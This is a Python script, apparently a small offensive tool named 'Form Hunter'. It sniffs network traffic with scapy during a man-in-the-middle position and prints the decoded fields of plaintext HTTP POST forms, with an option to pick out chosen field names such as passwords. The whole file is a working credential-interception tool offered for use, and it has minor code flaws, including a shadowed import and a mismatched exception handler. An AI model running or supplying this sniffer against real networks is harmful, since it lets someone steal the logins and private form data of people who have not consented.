import argparse
import urllib.parse
from warnings import filters

from scapy.all import *
from colorama import Fore, init

init()

filters = []
waiting_for_payload = False


def print_hunted_form_input(name, value):
    print(f"> {Fore.YELLOW}{name}{Fore.RESET}={Fore.GREEN}{value}{Fore.RESET}")

def payload_process(payload):
    print("== [PAYLOAD] ==")

    for item in payload.split("&"):
        data = item.split("=")
        
        try:
            data[0] = urllib.parse.unquote(data[0])
            data[1] = urllib.parse.unquote(data[1])

            if len(filters) == 0:
                print_hunted_form_input(data[0], data[1])
            
            else:
                for filter in filters:
                    if filter in data[0].lower():
                        print_hunted_form_input(data[0], data[1])
        
        except KeyError:
            pass

def process_http_packet(packet):
    global waiting_for_payload

    if packet[TCP].payload:
        payload_string = bytes(packet[TCP].payload).decode('UTF8','replace')

        if "POST /" in payload_string:
            print(f"\n{packet[IP].src} --> {packet[IP].dst}:{packet[IP].dport}")
            
            for line in payload_string.split('\r\n'):
                if line == "":
                    waiting_for_payload = True

                else:
                    if not waiting_for_payload:
                        print(f"{Fore.RED}{line}{Fore.RESET}")
                    
                    else:
                        waiting_for_payload = False
                        payload_process(line)
        
        elif waiting_for_payload:
            waiting_for_payload = False
            
            payload_process(payload_string)


if __name__ == "__main__":
    print(f"""{Fore.RED}

   █████▒▒█████   ██▀███   ███▄ ▄███▓                 
 ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒                 
 ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░                 
 ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒██    ▒██                  
 ░▒█░   ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒                 
  ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░                 
  ░       ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░                 
  ░ ░   ░ ░ ░ ▒    ░░   ░ ░      ░                    
            ░ ░     ░            ░                    
                                                      
  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
 ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
 ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
 ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
 ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
  ░  ░  ░   ░              ░             ░  ░   ░     
                                                                                                
 coded by <{Fore.RESET}edo0xff{Fore.RED}>{Fore.RESET}
    """)

    parser = argparse.ArgumentParser(description="HTTP POST Packet Sniffer, this is useful when you're a man in the middle.")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface", required=True)
    parser.add_argument("-f", "--filter", help="Form inputs to filter", required=False, default="")
    
    args = parser.parse_args()

    if args.filter != "":
        for filter in args.filter.split(","):
            filters.append(filter.lower())

    print(f" > Hunted form inputs: {Fore.CYAN}{filters}{Fore.RESET}")
    print(f" > Sniffing {Fore.CYAN}{args.iface}{Fore.RESET}")

    sniff(filter='tcp', prn=process_http_packet, iface=args.iface, store=False)